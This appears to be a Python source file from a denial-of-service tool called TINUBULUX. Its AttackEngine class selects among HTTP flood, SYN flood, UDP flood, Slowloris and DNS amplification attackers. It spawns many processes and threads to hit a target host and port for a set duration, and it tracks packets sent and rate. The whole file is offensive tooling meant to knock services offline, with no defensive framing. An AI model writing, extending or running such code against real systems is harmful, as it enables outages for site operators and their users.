import multiprocessing
import threading
import time
import signal
import sys
from typing import Dict, List

from .attackers.http_flood import HTTPFlood
from .attackers.syn_flood import SYNFlood
from .attackers.udp_flood import UDPFlood
from .attackers.slowloris import SlowlorisAttack
from .attackers.dns_amp import DNSAmplification

class AttackEngine:
    def __init__(self, args, config, logger):
        self.args = args
        self.config = config
        self.logger = logger
        self.running = multiprocessing.Value('b', True)
        self.stats = {
            'sent': multiprocessing.Value('Q', 0),
            'failed': multiprocessing.Value('Q', 0),
            'bps': multiprocessing.Value('Q', 0),
            'start_time': None
        }
        self.processes = []
        self.threads = []
        self.attacker = None
        
    def _get_attacker(self):
        method = self.args.method.lower()
        attackers = {
            'http': HTTPFlood,
            'syn': SYNFlood,
            'udp': UDPFlood,
            'slowloris': SlowlorisAttack,
            'dns': DNSAmplification
        }
        return attackers.get(method, HTTPFlood)
    
    def _worker(self, worker_id):
        attacker_class = self._get_attacker()
        attacker = attacker_class(self.args, self.config, self.stats, self.running, worker_id)
        attacker.attack()
    
    def start(self):
        self.stats['start_time'] = time.time()
        self.logger.info(f"Initializing {self.args.method.upper()} attack on {self.args.target}:{self.args.port}")
        self.logger.info(f"Workers: {self.args.connections} | Threads: {self.args.threads}")
        
        # Spawn multiprocessing workers
        workers_per_thread = self.args.connections // self.args.threads
        
        for i in range(self.args.threads):
            p = multiprocessing.Process(target=self._spawn_workers, args=(workers_per_thread, i))
            p.daemon = True
            p.start()
            self.processes.append(p)
            
        self.logger.success("Attack engine online. Press Ctrl+C to stop.")
    
    def _spawn_workers(self, count, thread_id):
        threads = []
        for i in range(count):
            t = threading.Thread(target=self._worker, args=(f"{thread_id}-{i}",))
            t.daemon = True
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
    
    def stop(self):
        self.running.value = False
        for p in self.processes:
            p.terminate()
            p.join(timeout=2)
        self.logger.info("TINUBULUX stopped.")
    
    def wait(self):
        if self.args.duration > 0:
            time.sleep(self.args.duration)
            self.stop()
        else:
            while self.running.value:
                time.sleep(1)
    
    def get_stats(self):
        elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
        return {
            'sent': self.stats['sent'].value,
            'failed': self.stats['failed'].value,
            'bps': self.stats['bps'].value,
            'elapsed': elapsed,
            'pps': self.stats['sent'].value / max(elapsed, 1),
            'target': f"{self.args.target}:{self.args.port}",
            'method': self.args.method.upper(),
            'workers': self.args.connections
        }
